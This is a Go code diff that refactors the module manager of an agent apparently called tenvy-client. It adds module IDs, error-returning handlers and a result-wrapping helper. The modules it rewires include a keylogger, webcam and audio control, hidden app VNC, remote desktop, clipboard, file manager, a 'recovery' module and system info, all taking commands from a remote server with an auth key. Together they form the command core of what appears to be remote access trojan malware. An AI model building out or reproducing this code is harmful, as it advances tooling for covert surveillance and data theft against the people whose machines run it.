@@ -28,7 +28,7 @@ import (
 	"github.com/rootbay/tenvy-client/internal/protocol"
 )
 
-type ModuleRuntime struct {
+type Config struct {
 	AgentID      string
 	BaseURL      string
 	AuthKey      string
@@ -37,7 +37,7 @@ type ModuleRuntime struct {
 	UserAgent    string
 	Provider     systeminfo.AgentInfoProvider
 	BuildVersion string
-	Config       protocol.AgentConfig
+	AgentConfig  protocol.AgentConfig
 	Plugins      *plugins.Manager
 }
 
@@ -109,11 +109,39 @@ type ModuleMetadata struct {
 }
 
 type Module interface {
+	ID() string
+	Init(context.Context, Config) error
+	Handle(context.Context, protocol.Command) error
+	UpdateConfig(Config) error
+	Shutdown(context.Context) error
+}
+
+type moduleMetadataProvider interface {
 	Metadata() ModuleMetadata
-	Init(context.Context, ModuleRuntime) error
-	Handle(context.Context, protocol.Command) protocol.CommandResult
-	UpdateConfig(context.Context, ModuleRuntime) error
-	Shutdown(context.Context)
+}
+
+type CommandResultError struct {
+	Result protocol.CommandResult
+}
+
+func (e *CommandResultError) Error() string {
+	if e == nil {
+		return ""
+	}
+	if message := strings.TrimSpace(e.Result.Error); message != "" {
+		return message
+	}
+	if e.Result.Success {
+		if output := strings.TrimSpace(e.Result.Output); output != "" {
+			return output
+		}
+		return "command completed"
+	}
+	return "command failed"
+}
+
+func WrapCommandResult(result protocol.CommandResult) error {
+	return &CommandResultError{Result: result}
 }
 
 type moduleEntry struct {
@@ -159,9 +187,20 @@ func newModuleManager() *moduleManager {
 }
 
 func (r *moduleManager) register(m Module) {
-	metadata := m.Metadata()
+	provider, ok := any(m).(moduleMetadataProvider)
+	if !ok {
+		panic("agent module missing metadata provider")
+	}
+	metadata := provider.Metadata()
+	moduleID := strings.TrimSpace(m.ID())
+	if moduleID == "" {
+		panic("agent module missing identifier")
+	}
 	if strings.TrimSpace(metadata.ID) == "" {
 		panic("agent module missing metadata id")
+	}
+	if metadata.ID != moduleID {
+		panic(fmt.Sprintf("module %s metadata id mismatch: %s", moduleID, metadata.ID))
 	}
 	commands := metadata.Commands
 	if len(commands) == 0 {
@@ -190,13 +229,13 @@ func (r *moduleManager) register(m Module) {
 	}
 }
 
-func (r *moduleManager) Init(ctx context.Context, runtime ModuleRuntime) error {
+func (r *moduleManager) Init(ctx context.Context, cfg Config) error {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 
 	var errs []error
 	for _, entry := range r.lifecycle {
-		if err := entry.module.Init(ctx, runtime); err != nil {
+		if err := entry.module.Init(ctx, cfg); err != nil {
 			label := entry.metadata.Title
 			if strings.TrimSpace(label) == "" {
 				label = entry.metadata.ID
@@ -208,13 +247,13 @@ func (r *moduleManager) Init(ctx context.Context, runtime ModuleRuntime) error {
 	return errors.Join(errs...)
 }
 
-func (r *moduleManager) UpdateConfig(ctx context.Context, runtime ModuleRuntime) error {
+func (r *moduleManager) UpdateConfig(cfg Config) error {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 
 	var errs []error
 	for _, entry := range r.lifecycle {
-		if err := entry.module.UpdateConfig(ctx, runtime); err != nil {
+		if err := entry.module.UpdateConfig(cfg); err != nil {
 			label := entry.metadata.Title
 			if strings.TrimSpace(label) == "" {
 				label = entry.metadata.ID
@@ -244,16 +283,55 @@ func (r *moduleManager) HandleCommand(ctx context.Context, cmd protocol.Command)
 	if !ok {
 		return false, protocol.CommandResult{}
 	}
-	return true, entry.module.Handle(ctx, cmd)
+	return true, r.wrapCommandResult(cmd, entry.module.Handle(ctx, cmd))
 }
 
-func (r *moduleManager) Shutdown(ctx context.Context) {
+func (r *moduleManager) Shutdown(ctx context.Context) error {
 	r.mu.RLock()
 	entries := append([]*moduleEntry(nil), r.lifecycle...)
 	r.mu.RUnlock()
 
+	var errs []error
 	for index := len(entries) - 1; index >= 0; index-- {
-		entries[index].module.Shutdown(ctx)
+		if err := entries[index].module.Shutdown(ctx); err != nil {
+			label := entries[index].metadata.Title
+			if strings.TrimSpace(label) == "" {
+				label = entries[index].metadata.ID
+			}
+			errs = append(errs, fmt.Errorf("%s: %w", label, err))
+		}
+	}
+
+	return errors.Join(errs...)
+}
+
+func (r *moduleManager) wrapCommandResult(cmd protocol.Command, err error) protocol.CommandResult {
+	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
+	if err == nil {
+		return protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     true,
+			CompletedAt: completedAt,
+		}
+	}
+
+	var resultErr *CommandResultError
+	if errors.As(err, &resultErr) {
+		result := resultErr.Result
+		if strings.TrimSpace(result.CommandID) == "" {
+			result.CommandID = cmd.ID
+		}
+		if strings.TrimSpace(result.CompletedAt) == "" {
+			result.CompletedAt = completedAt
+		}
+		return result
+	}
+
+	return protocol.CommandResult{
+		CommandID:   cmd.ID,
+		Success:     false,
+		Error:       err.Error(),
+		CompletedAt: completedAt,
 	}
 }
 
@@ -288,6 +366,10 @@ func (m *appVncModule) Metadata() ModuleMetadata {
 	}
 }
 
+func (m *appVncModule) ID() string {
+	return "app-vnc"
+}
+
 func (m *appVncModule) ensureController() *appvnc.Controller {
 	if m.controller == nil {
 		m.controller = appvnc.NewController()
@@ -295,38 +377,38 @@ func (m *appVncModule) ensureController() *appvnc.Controller {
 	return m.controller
 }
 
-func (m *appVncModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *appVncModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *appVncModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
-}
-
-func (m *appVncModule) configure(runtime ModuleRuntime) error {
+func (m *appVncModule) configure(cfg Config) error {
 	controller := m.ensureController()
 	root := filepath.Join(os.TempDir(), "tenvy-appvnc")
 	if err := os.MkdirAll(root, 0o755); err != nil {
 		return fmt.Errorf("prepare app-vnc workspace root: %w", err)
 	}
 	controller.Update(appvnc.Config{
-		Logger:        runtime.Logger,
+		Logger:        cfg.Logger,
 		WorkspaceRoot: root,
 	})
 	return nil
 }
 
-func (m *appVncModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *appVncModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *appVncModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	controller := m.ensureController()
 	if controller == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "app-vnc controller unavailable",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return controller.HandleCommand(ctx, cmd)
+	return WrapCommandResult(controller.HandleCommand(ctx, cmd))
 }
 
 func (m *appVncModule) HandleInputBurst(ctx context.Context, burst protocol.AppVncInputBurst) error {
@@ -337,14 +419,15 @@ func (m *appVncModule) HandleInputBurst(ctx context.Context, burst protocol.AppV
 	return controller.HandleInputBurst(ctx, burst)
 }
 
-func (m *appVncModule) Shutdown(ctx context.Context) {
+func (m *appVncModule) Shutdown(ctx context.Context) error {
 	if m.controller != nil {
 		m.controller.Shutdown(ctx)
 	}
+	return nil
 }
 
-func (a *Agent) moduleRuntime() ModuleRuntime {
-	return ModuleRuntime{
+func (a *Agent) moduleRuntime() Config {
+	return Config{
 		AgentID:      a.id,
 		BaseURL:      a.baseURL,
 		AuthKey:      a.key,
@@ -353,12 +436,12 @@ func (a *Agent) moduleRuntime() ModuleRuntime {
 		UserAgent:    a.userAgent(),
 		Provider:     a,
 		BuildVersion: a.buildVersion,
-		Config:       a.config,
+		AgentConfig:  a.config,
 		Plugins:      a.plugins,
 	}
 }
 
-type remoteDesktopEngineFactory func(context.Context, ModuleRuntime, remotedesktop.Config) (remotedesktop.Engine, string, error)
+type remoteDesktopEngineFactory func(context.Context, Config, remotedesktop.Config) (remotedesktop.Engine, string, error)
 
 type remoteDesktopModule struct {
 	mu              sync.Mutex
@@ -395,15 +478,19 @@ func (m *remoteDesktopModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *remoteDesktopModule) Init(ctx context.Context, runtime ModuleRuntime) error {
-	return m.configure(ctx, runtime)
+func (m *remoteDesktopModule) ID() string {
+	return "remote-desktop"
 }
 
-func (m *remoteDesktopModule) UpdateConfig(ctx context.Context, runtime ModuleRuntime) error {
-	return m.configure(ctx, runtime)
+func (m *remoteDesktopModule) Init(ctx context.Context, cfg Config) error {
+	return m.configure(ctx, cfg)
 }
 
-func (m *remoteDesktopModule) configure(ctx context.Context, runtime ModuleRuntime) error {
+func (m *remoteDesktopModule) UpdateConfig(cfg Config) error {
+	return m.configure(context.Background(), cfg)
+}
+
+func (m *remoteDesktopModule) configure(ctx context.Context, runtime Config) error {
 	var requestTimeout time.Duration
 	if runtime.HTTPClient != nil {
 		requestTimeout = runtime.HTTPClient.Timeout
@@ -486,24 +573,24 @@ func (m *remoteDesktopModule) configure(ctx context.Context, runtime ModuleRunti
 	return nil
 }
 
-func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	engine := m.currentEngine()
 	if engine == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "remote desktop subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
 	payload, err := remotedesktop.DecodeCommandPayload(cmd.Payload)
 	if err != nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       err.Error(),
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
 
 	var actionErr error
@@ -531,7 +618,7 @@ func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) 
 		result.Success = true
 		result.Output = fmt.Sprintf("remote desktop %s action processed", payload.Action)
 	}
-	return result
+	return WrapCommandResult(result)
 }
 
 func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protocol.RemoteDesktopInputBurst) error {
@@ -578,11 +665,12 @@ func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protoc
 	return engine.HandleInput(ctx, payload)
 }
 
-func (m *remoteDesktopModule) Shutdown(context.Context) {
+func (m *remoteDesktopModule) Shutdown(context.Context) error {
 	engine := m.currentEngine()
 	if engine != nil {
 		engine.Shutdown()
 	}
+	return nil
 }
 
 func (m *remoteDesktopModule) currentEngine() remotedesktop.Engine {
@@ -591,7 +679,7 @@ func (m *remoteDesktopModule) currentEngine() remotedesktop.Engine {
 	return m.engine
 }
 
-func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime ModuleRuntime, cfg remotedesktop.Config) (remotedesktop.Engine, string, error) {
+func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime Config, cfg remotedesktop.Config) (remotedesktop.Engine, string, error) {
 	manager := runtime.Plugins
 	client := runtime.HTTPClient
 	baseURL := strings.TrimSpace(runtime.BaseURL)
@@ -658,15 +746,19 @@ func (m *webcamModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *webcamModule) Init(ctx context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *webcamModule) ID() string {
+	return "webcam-control"
 }
 
-func (m *webcamModule) UpdateConfig(ctx context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *webcamModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *webcamModule) configure(runtime ModuleRuntime) error {
+func (m *webcamModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *webcamModule) configure(runtime Config) error {
 	cfg := webcamctrl.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
@@ -683,19 +775,21 @@ func (m *webcamModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.manager == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "webcam subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.manager.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
-func (m *webcamModule) Shutdown(context.Context) {}
+func (m *webcamModule) Shutdown(context.Context) error {
+	return nil
+}
 
 func (m *audioModule) Metadata() ModuleMetadata {
 	return ModuleMetadata{
@@ -716,15 +810,19 @@ func (m *audioModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *audioModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *audioModule) ID() string {
+	return "audio-control"
 }
 
-func (m *audioModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *audioModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *audioModule) configure(runtime ModuleRuntime) error {
+func (m *audioModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *audioModule) configure(runtime Config) error {
 	cfg := audioctrl.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
@@ -741,22 +839,23 @@ func (m *audioModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.bridge == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "audio subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.bridge.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.bridge.HandleCommand(ctx, cmd))
 }
 
-func (m *audioModule) Shutdown(context.Context) {
+func (m *audioModule) Shutdown(context.Context) error {
 	if m.bridge != nil {
 		m.bridge.Shutdown()
 	}
+	return nil
 }
 
 func (m *keyloggerModule) Metadata() ModuleMetadata {
@@ -778,15 +877,19 @@ func (m *keyloggerModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *keyloggerModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *keyloggerModule) ID() string {
+	return "keylogger"
 }
 
-func (m *keyloggerModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *keyloggerModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *keyloggerModule) configure(runtime ModuleRuntime) error {
+func (m *keyloggerModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *keyloggerModule) configure(runtime Config) error {
 	cfg := keyloggerctrl.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
@@ -803,22 +906,23 @@ func (m *keyloggerModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.manager == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "keylogger subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.manager.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
-func (m *keyloggerModule) Shutdown(context.Context) {
+func (m *keyloggerModule) Shutdown(context.Context) error {
 	if m.manager != nil {
 		m.manager.Shutdown(context.Background())
 	}
+	return nil
 }
 
 type clipboardModule struct {
@@ -844,15 +948,19 @@ func (m *clipboardModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *clipboardModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *clipboardModule) ID() string {
+	return "clipboard"
 }
 
-func (m *clipboardModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *clipboardModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *clipboardModule) configure(runtime ModuleRuntime) error {
+func (m *clipboardModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *clipboardModule) configure(runtime Config) error {
 	cfg := clipboard.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
@@ -869,22 +977,23 @@ func (m *clipboardModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *clipboardModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *clipboardModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.manager == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "clipboard subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.manager.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
-func (m *clipboardModule) Shutdown(context.Context) {
+func (m *clipboardModule) Shutdown(context.Context) error {
 	if m.manager != nil {
 		m.manager.Shutdown()
 	}
+	return nil
 }
 
 type fileManagerModule struct {
@@ -910,15 +1019,19 @@ func (m *fileManagerModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *fileManagerModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *fileManagerModule) ID() string {
+	return "file-manager"
 }
 
-func (m *fileManagerModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *fileManagerModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *fileManagerModule) configure(runtime ModuleRuntime) error {
+func (m *fileManagerModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *fileManagerModule) configure(runtime Config) error {
 	cfg := filemanager.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
@@ -935,20 +1048,21 @@ func (m *fileManagerModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.manager == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "file manager subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.manager.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
-func (m *fileManagerModule) Shutdown(context.Context) {
+func (m *fileManagerModule) Shutdown(context.Context) error {
 	// no teardown required for file system operations today
+	return nil
 }
 
 type taskManagerModule struct {
@@ -974,15 +1088,19 @@ func (m *taskManagerModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *taskManagerModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *taskManagerModule) ID() string {
+	return "task-manager"
 }
 
-func (m *taskManagerModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *taskManagerModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *taskManagerModule) configure(runtime ModuleRuntime) error {
+func (m *taskManagerModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *taskManagerModule) configure(runtime Config) error {
 	if m.manager == nil {
 		m.manager = taskmanager.NewManager(runtime.Logger)
 		return nil
@@ -991,20 +1109,21 @@ func (m *taskManagerModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.manager == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "task manager subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.manager.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
-func (m *taskManagerModule) Shutdown(context.Context) {
+func (m *taskManagerModule) Shutdown(context.Context) error {
 	// no persistent resources to release today
+	return nil
 }
 
 type tcpConnectionsModule struct {
@@ -1030,15 +1149,19 @@ func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *tcpConnectionsModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *tcpConnectionsModule) ID() string {
+	return "tcp-connections"
 }
 
-func (m *tcpConnectionsModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *tcpConnectionsModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *tcpConnectionsModule) configure(runtime ModuleRuntime) error {
+func (m *tcpConnectionsModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *tcpConnectionsModule) configure(runtime Config) error {
 	cfg := tcpconnections.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
@@ -1055,20 +1178,21 @@ func (m *tcpConnectionsModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.manager == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "tcp connections subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.manager.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
-func (m *tcpConnectionsModule) Shutdown(context.Context) {
+func (m *tcpConnectionsModule) Shutdown(context.Context) error {
 	// no shutdown hooks required for TCP connection sweeps today
+	return nil
 }
 
 type recoveryModule struct {
@@ -1094,15 +1218,19 @@ func (m *recoveryModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *recoveryModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *recoveryModule) ID() string {
+	return "recovery"
 }
 
-func (m *recoveryModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *recoveryModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *recoveryModule) configure(runtime ModuleRuntime) error {
+func (m *recoveryModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *recoveryModule) configure(runtime Config) error {
 	cfg := recovery.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
@@ -1119,22 +1247,23 @@ func (m *recoveryModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *recoveryModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *recoveryModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.manager == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "recovery subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.manager.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
-func (m *recoveryModule) Shutdown(context.Context) {
+func (m *recoveryModule) Shutdown(context.Context) error {
 	if m.manager != nil {
 		m.manager.Shutdown()
 	}
+	return nil
 }
 
 type clientChatModule struct {
@@ -1160,15 +1289,19 @@ func (m *clientChatModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *clientChatModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *clientChatModule) ID() string {
+	return "client-chat"
 }
 
-func (m *clientChatModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *clientChatModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *clientChatModule) configure(runtime ModuleRuntime) error {
+func (m *clientChatModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *clientChatModule) configure(runtime Config) error {
 	cfg := clientchat.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
@@ -1185,22 +1318,23 @@ func (m *clientChatModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *clientChatModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *clientChatModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.supervisor == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "client chat subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.supervisor.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.supervisor.HandleCommand(ctx, cmd))
 }
 
-func (m *clientChatModule) Shutdown(ctx context.Context) {
+func (m *clientChatModule) Shutdown(ctx context.Context) error {
 	if m.supervisor != nil {
 		m.supervisor.Shutdown(ctx)
 	}
+	return nil
 }
 
 type systemInfoModule struct {
@@ -1226,15 +1360,19 @@ func (m *systemInfoModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *systemInfoModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *systemInfoModule) ID() string {
+	return "system-info"
 }
 
-func (m *systemInfoModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *systemInfoModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
 }
 
-func (m *systemInfoModule) configure(runtime ModuleRuntime) error {
+func (m *systemInfoModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *systemInfoModule) configure(runtime Config) error {
 	if runtime.Provider == nil {
 		return fmt.Errorf("missing agent provider")
 	}
@@ -1242,16 +1380,18 @@ func (m *systemInfoModule) configure(runtime ModuleRuntime) error {
 	return nil
 }
 
-func (m *systemInfoModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+func (m *systemInfoModule) Handle(ctx context.Context, cmd protocol.Command) error {
 	if m.collector == nil {
-		return protocol.CommandResult{
+		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
 			Error:       "system information subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		}
+		})
 	}
-	return m.collector.HandleCommand(ctx, cmd)
+	return WrapCommandResult(m.collector.HandleCommand(ctx, cmd))
 }
 
-func (m *systemInfoModule) Shutdown(context.Context) {}
+func (m *systemInfoModule) Shutdown(context.Context) error {
+	return nil
+}
